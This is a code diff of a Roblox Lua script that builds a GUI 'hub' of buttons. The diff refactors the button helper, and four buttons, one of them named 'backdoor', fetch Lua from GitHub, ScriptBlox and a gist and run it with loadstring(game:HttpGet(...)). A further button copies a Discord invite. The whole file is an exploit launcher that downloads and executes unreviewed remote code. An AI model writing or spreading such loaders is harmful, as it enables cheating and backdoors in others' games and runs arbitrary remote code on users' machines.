@@ -21,7 +21,7 @@ layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
 layout.VerticalAlignment = Enum.VerticalAlignment.Top
 
 -- Helper function to create buttons
-local function createButton(name, loadstringCode)
+local function createButton(name, callback)
     local button = Instance.new("TextButton")
     button.Text = name
     button.Size = UDim2.new(0.8, 0, 0.1, 0)
@@ -31,16 +31,35 @@ local function createButton(name, loadstringCode)
     button.TextScaled = true
     button.Parent = frame
 
-    button.MouseButton1Click:Connect(function()
-        loadstring(game:HttpGet(loadstringCode))()
-    end)
+    button.MouseButton1Click:Connect(callback)
 end
 
 -- Create buttons for the scripts
-createButton("backdoor", "https://raw.githubusercontent.com/iK4oS/backdoor.exe/master/source.lua")
-createButton("LALOL", "https://scriptblox.com/raw/Universal-Script-LALOL-HUB-11604")
-createButton("QuirkyCMD", "https://gist.github.com/someunknowndude/38cecea5be9d75cb743eac8b1eaf6758/raw")
-createButton("EdgelY", "https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source")
+createButton("backdoor", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/master/source.lua"))()
+end)
+
+createButton("LALOL", function()
+    loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-LALOL-HUB-11604"))()
+end)
+
+createButton("QuirkyCMD", function()
+    loadstring(game:HttpGet("https://gist.github.com/someunknowndude/38cecea5be9d75cb743eac8b1eaf6758/raw"))()
+end)
+
+createButton("EdgelY", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
+end)
+
+-- Add the "Discord" button
+createButton("Discord", function()
+    setclipboard("https://discord.gg/CEhHrnCd6M") -- Copies the link to the clipboard
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+        Title = "Copied!";
+        Text = "Discord link has been copied!";
+        Duration = 3;
+    })
+end)
 
 -- Add an on/off toggle button outside the GUI
 local toggleButton = Instance.new("TextButton")
